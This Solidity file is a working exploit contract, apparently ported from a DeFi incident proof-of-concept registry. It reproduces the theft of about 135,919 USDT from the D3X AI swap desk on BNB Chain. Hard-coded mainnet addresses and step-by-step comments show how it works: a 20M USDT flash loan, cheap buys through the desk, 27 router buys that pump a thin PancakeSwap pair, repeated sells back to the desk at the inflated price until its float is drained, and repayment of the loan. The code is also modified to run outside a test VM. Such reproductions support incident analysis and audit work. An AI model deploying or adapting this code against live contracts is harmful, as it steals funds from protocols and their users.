// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// D3X AI swap-desk exploit. The D3X "swap desk" (TransparentUpgradeableProxy
// exchange()) prices D3XAT off a LIVE PancakeSwap-v2 spot pair via
// D3XAT.price() -> PancakeRouter.getAmountsOut(1e18,[D3XAT,USDT]) — no TWAP,
// no price band, and the desk pays out of its own USDT/D3XAT float. The
// attacker flash-borrows 20M USDT, buys D3XAT cheap through the desk at the
// un-manipulated spot (~1.31 USDT/D3XAT), pumps the thin D3XAT/USDT pair via
// 27 router buys (reserves 261,398/344,462 -> 13,898/6,521,450, price -> ~469,
// a 356x move), sells the cheap D3XAT back to the desk at the inflated price
// 20x until its USDT float is drained (21st sell reverts), unwinds the pump by
// dumping the router-bought D3XAT back into the pair, and repays the flash
// loan - pocketing the desk's USDT float (~135,919 USDT / ~190 BNB).
//
// Attacker EOA:      0x4b63c0cf524f71847ea05b59f3077a224d922e8d
// Attack Contract:   0x3b3e1edeb726b52d5de79cf8dd8b84995d9aa27c
// Attack Tx:         https://bscscan.com/tx/0x26bcefc152d8cd49f4bb13a9f8a6846be887d7075bc81fa07aa8c0019bd6591f
//
// Cleaned for plain EVM recorder: removed forge-std Test / BaseTestWithBalanceLog
// inheritance and vm.createSelectFork/vm.deal cheatcodes (would EXTCODESIZE=0
// revert outside a real Foundry VM), replaced TokenHelper library calls with a
// minimal IERC20 interface, and renamed testExploit() -> attack() as a plain
// external entrypoint (the attack never runs inside a constructor, so this is
// a 1:1 behavioral port of the original registry PoC's callback flow).

interface IERC20Min {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IPancakeRouterMin {
    function getAmountsIn(uint256 amountOut, address[] memory path) external view returns (uint256[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakeV3PoolFlash {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IProxy {
    function exchange(address fromToken, address toToken, uint256 amount) external;
}

address constant PANCAKE_V3_POOL = 0x92b7807bF19b7DDdf89b706143896d05228f3121;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant USDT_ADDR = 0x55d398326f99059fF775485246999027B3197955;
address constant PROXY = 0xb8ad82c4771DAa852DdF00b70Ba4bE57D22eDD99;
address constant D3XAT = 0x2Cc8B879E3663d8126fe15daDaaA6Ca8D964BbBE;

contract d3xai {
    uint256 numPancakeOperRound = 27;
    address[] public pancakeBuyers = new address[](numPancakeOperRound);
    address[] public pancakeSellers = new address[](numPancakeOperRound);

    uint256 numProxyOperRound = 2;
    address[] public proxyBuyers = new address[](numProxyOperRound);
    ProxySeller proxySeller;

    constructor() {
        // Deploy the helper fan-out (mirrors the real Foundry test's setUp()).
        // This is unrecorded prep - the recorded step is attack() below.
        ProxyBuyerHelper proxyBuyerHelper = new ProxyBuyerHelper();
        for (uint256 i = 0; i < proxyBuyers.length; i++) {
            ProxyBuyer buyer = new ProxyBuyer(address(proxyBuyerHelper));
            proxyBuyers[i] = address(buyer);
        }
        proxySeller = new ProxySeller();

        PancakeBuyerHelper pancakeBuyerHelper = new PancakeBuyerHelper();
        for (uint256 i = 0; i < pancakeBuyers.length; i++) {
            PancakeBuyer buyer = new PancakeBuyer(address(pancakeBuyerHelper));
            pancakeBuyers[i] = address(buyer);
        }
        for (uint256 i = 0; i < pancakeSellers.length; i++) {
            PancakeSeller seller = new PancakeSeller();
            pancakeSellers[i] = address(seller);
        }
    }

    function attack() external {
        // Step 1: flash-borrow 20M USDT from the PancakeSwap-v3 USDT pool.
        uint256 borrowAmount = 20_000_000 ether;
        IPancakeV3PoolFlash(PANCAKE_V3_POOL).flash(address(this), borrowAmount, 0, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        IERC20Min usdt = IERC20Min(USDT_ADDR);

        address[] memory USDT_D3XAT_PATH = new address[](2);
        USDT_D3XAT_PATH[0] = USDT_ADDR;
        USDT_D3XAT_PATH[1] = D3XAT;

        // Step 2: buy D3XAT cheap through the desk's exchange() at the
        // un-manipulated spot price (~1.31 USDT/D3XAT) and park it with proxySeller.
        for (uint256 i = 0; i < proxyBuyers.length; i++) {
            ProxyBuyer buyer = ProxyBuyer(proxyBuyers[i]);
            uint256 amountOut = 9000 ether;
            (uint256[] memory amounts) = IPancakeRouterMin(PANCAKE_ROUTER).getAmountsIn(amountOut, USDT_D3XAT_PATH);
            uint256 amountIn = amounts[0];

            usdt.approve(address(buyer), amountIn);
            buyer.buy(PROXY, USDT_ADDR, D3XAT, address(proxySeller), amountIn);
        }

        // Step 3: pump the thin D3XAT/USDT PancakeSwap pair with 27 router
        // buys, dragging the desk's price() reading from ~1.31 to ~469 (356x).
        for (uint256 i = 0; i < pancakeBuyers.length; i++) {
            PancakeBuyer buyer = PancakeBuyer(pancakeBuyers[i]);
            uint256 amountOut = 9900 ether;
            (uint256[] memory amounts) = IPancakeRouterMin(PANCAKE_ROUTER).getAmountsIn(amountOut, USDT_D3XAT_PATH);
            uint256 amountIn = amounts[0];
            usdt.approve(address(buyer), amountIn);
            buyer.buy(USDT_ADDR, D3XAT, pancakeSellers[i], amountIn);
        }

        // Step 4: sell the cheap D3XAT back to the desk at the inflated price
        // until its USDT float is drained (the sell after the float is empty reverts).
        for (uint256 i = 0; i < 30; i++) {
            uint256 amount = 29740606898687781957;
            try proxySeller.sell(PROXY, D3XAT, USDT_ADDR, amount, address(this)) {
            } catch {
                break;
            }
        }

        // Step 5: unwind - dump the Step-3 router-bought D3XAT back into the
        // pair, recovering the USDT spent pumping it.
        IERC20Min d3xat = IERC20Min(D3XAT);
        for (uint256 i = 0; i < pancakeSellers.length; i++) {
            PancakeSeller seller = PancakeSeller(pancakeSellers[i]);
            if (d3xat.balanceOf(address(seller)) > 0) {
                seller.sell(USDT_ADDR, D3XAT, address(this));
            }
        }

        // Step 6: repay the flash loan (principal + fee). Whatever USDT
        // remains on this contract afterward is the drained desk float.
        usdt.transfer(PANCAKE_V3_POOL, 20_000_000 ether + fee0);
    }
}

contract PancakeBuyerHelper {
    // 0xacfca76f
    function buy(address token1, address token2, address receiver, uint256 amount) public {
        IERC20Min usdt = IERC20Min(token1);
        IERC20Min d3xat = IERC20Min(token2);
        usdt.transferFrom(msg.sender, address(this), amount);
        usdt.approve(PANCAKE_ROUTER, amount);

        address[] memory path = new address[](2);
        path[0] = token1;
        path[1] = token2;

        IPancakeRouterMin(payable(PANCAKE_ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
        uint256 bal = d3xat.balanceOf(address(this));
        d3xat.transfer(receiver, bal);
    }
}

contract PancakeBuyer {
    address targetContract;

    constructor(
        address target
    ) {
        targetContract = target;
    }
    // 0xacfca76f

    function buy(address token1, address token2, address receiver, uint256 amount) public {
        // NOTE: intentionally does not check `success` - this exactly mirrors
        // the real registry PoC, whose Step 3 loop has no try/catch. In the
        // real attack tx the last 2 of 27 buys ran out of USDT budget and
        // this delegatecall's inner transferFrom reverted with "BEP20:
        // transfer amount exceeds balance" - but because the return value is
        // unchecked, the outer call returns normally and the loop continues.
        targetContract.delegatecall(
            abi.encodeWithSignature("buy(address,address,address,uint256)", token1, token2, receiver, amount)
        );
    }
}

contract PancakeSeller {
    // 0x83b95948
    function sell(address tokenOut, address tokenIn, address receiver) public {
        IERC20Min d3xat = IERC20Min(tokenIn);
        IERC20Min usdt = IERC20Min(tokenOut);
        uint256 d3Bal = d3xat.balanceOf(address(this));
        d3xat.approve(PANCAKE_ROUTER, d3Bal);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        IPancakeRouterMin(payable(PANCAKE_ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            d3Bal, 0, path, address(this), block.timestamp
        );
        uint256 bal = usdt.balanceOf(address(this));
        usdt.transfer(receiver, bal);
    }
}

contract ProxyBuyerHelper {
    // 0xe09618e9
    function buy(address proxy, address token1, address token2, address receiver, uint256 amount) public {
        IERC20Min usdt = IERC20Min(token1);
        IERC20Min d3xat = IERC20Min(token2);
        usdt.transferFrom(msg.sender, address(this), amount);
        usdt.approve(proxy, amount);

        IProxy(proxy).exchange(token1, token2, amount);
        uint256 bal = d3xat.balanceOf(address(this));
        d3xat.transfer(receiver, bal);
    }
}

contract ProxyBuyer {
    address targetContract;

    constructor(
        address target
    ) {
        targetContract = target;
    }
    // 0xe09618e9

    function buy(address proxy, address token1, address token2, address receiver, uint256 amount) public {
        // NOTE: intentionally unchecked, same as PancakeBuyer.buy above.
        targetContract.delegatecall(
            abi.encodeWithSignature("buy(address,address,address,address,uint256)", proxy, token1, token2, receiver, amount)
        );
    }
}

contract ProxySeller {
    // 0x82839fae
    function sell(address proxy, address fromToken, address toToken, uint256 amount, address receiver) public {
        IERC20Min d3xat = IERC20Min(fromToken);
        IERC20Min usdt = IERC20Min(toToken);
        d3xat.approve(proxy, amount);
        IProxy(proxy).exchange(fromToken, toToken, amount);
        uint256 bal = usdt.balanceOf(address(this));
        usdt.transfer(receiver, bal);
    }
}
